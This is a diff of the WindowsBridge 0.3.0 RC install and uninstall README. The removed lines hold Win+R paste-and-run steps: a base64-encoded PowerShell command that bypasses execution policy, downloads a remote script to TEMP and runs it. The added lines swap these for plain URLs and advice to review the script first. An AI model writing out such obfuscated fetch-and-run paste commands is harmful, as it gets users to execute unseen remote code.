@@ -1,14 +1,12 @@
 WindowsBridge 0.3.0 RC
 
-INSTALL (3 STEPS)
+INSTALLER FILE (PAGES SHORTCUT NOT YET VERIFIED)
 -----------------
-1. Win + R
-2. Ctrl + V (paste the entire command below)
-3. Enter
+View/download the file below, inspect its contents, then run the saved local script using your permitted Windows PowerShell procedure.
 
-powershell.exe -NoExit -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnADsAJABwAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACcAVwBpAG4AZABvAHcAcwBCAHIAaQBkAGcAZQAtAGkAbgBzAHQAYQBsAGwALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AWgBUAEQAMwA4AEYALwBXAGkAbgBkAG8AdwBzAEIAcgBpAGQAZwBlAC8AcwB0AGEAYgBsAGUALwBpAG4AcwB0AGEAbABsAC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACQAcAA7ACYAIAAkAHAA
+https://raw.githubusercontent.com/ZTD38F/WindowsBridge/stable/install.ps1
 
-Downloads install.ps1 to a local file and runs it. UTF-16LE encoding is only for command-line quoting. Review the trusted source before running.
+This URL is the source file, not an automatic installer command. A short, readable Win+R / Ctrl+V / Enter launcher will replace it after verified Pages deployment. Review the trusted source before running.
 
 FIRST INSTALL
 -------------
@@ -48,8 +46,6 @@ windowsbridgectl auto-update-disable
 
 UNINSTALL (REMOVES LOCAL BRIDGE AND TASKS)
 ------------------------------------------
-1. Win + R
-2. Ctrl + V (paste the full command below)
-3. Enter
+Review the official uninstaller file before running it locally.
 
-powershell.exe -NoExit -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnADsAJABwAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACcAVwBpAG4AZABvAHcAcwBCAHIAaQBkAGcAZQAtAHUAbgBpAG4AcwB0AGEAbABsAC4AcABzADEAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFoAVABEADMAOABGAC8AVwBpAG4AZABvAHcAcwBCAHIAaQBkAGcAZQAvAHMAdABhAGIAbABlAC8AdQBuAGkAbgBzAHQAYQBsAGwALgBwAHMAMQAnACAALQBPAHUAdABGAGkAbABlACAAJABwADsAJgAgACQAcAA=
+https://raw.githubusercontent.com/ZTD38F/WindowsBridge/stable/uninstall.ps1
